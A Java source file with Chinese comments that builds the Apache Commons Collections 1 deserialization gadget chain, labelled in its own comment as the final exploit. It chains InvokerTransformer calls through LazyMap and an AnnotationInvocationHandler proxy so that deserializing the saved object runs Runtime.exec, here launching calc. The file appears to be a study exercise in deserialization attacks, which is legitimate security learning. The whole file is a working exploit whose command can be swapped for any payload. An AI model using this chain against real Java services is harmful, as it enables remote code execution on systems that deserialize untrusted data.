package org.example;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

// 正版 CC1 链最终 EXP
public class Main {

        public static void main(String[] args) throws Exception{

                Transformer[] transformers = new Transformer[]{
                        new ConstantTransformer(Runtime.class), 
                        new InvokerTransformer("getMethod",
                                new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                        new InvokerTransformer("invoke"
                                , new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                        new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
                };

                ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
                HashMap<Object, Object> hashMap = new HashMap<>();
                Map decorateMap = LazyMap.decorate(hashMap, chainedTransformer);

                // 通过反射实例化一个 AnnocationInvocationHandler 类对象
                Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
                Constructor declaredConstructor = c.getDeclaredConstructor(Class.class, Map.class);
                declaredConstructor.setAccessible(true);
                InvocationHandler invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Target.class, decorateMap);

                //生成动态代理类对象
                Map proxyMap = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader()
                        , new Class[]{Map.class}, invocationHandler);

                // 实例化一个 AnnotationInvocationHandler 类对象并进行序列化，之后反序列化时就会调用到 AnnotationInvocationHandler 类的 readObject 方法
                InvocationHandler invocationHandler1 = (InvocationHandler) declaredConstructor.newInstance(Override.class, proxyMap);

                serialize(invocationHandler1);
                unserialize("ser.bin");


        }
        public static void serialize(Object obj) throws IOException {
                ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
                oos.writeObject(obj);
        }
        public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
                ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
                Object obj = ois.readObject();
                return obj;
        }

}
